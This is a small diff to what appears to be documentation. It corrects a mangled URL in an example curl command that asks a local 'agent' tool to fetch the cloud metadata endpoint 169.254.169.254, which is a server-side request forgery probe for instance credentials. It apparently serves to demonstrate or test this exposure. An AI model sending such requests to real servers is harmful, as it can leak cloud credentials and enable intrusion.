@@ -125,7 +125,7 @@ curl -X POST http://localhost:8080/ \
         "params": {
             "name": "agent", 
             "arguments": {
-                "target": "[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)"
+                "target": "http://169.254.169.254/latest/meta-data/"
             }
         }
       }'
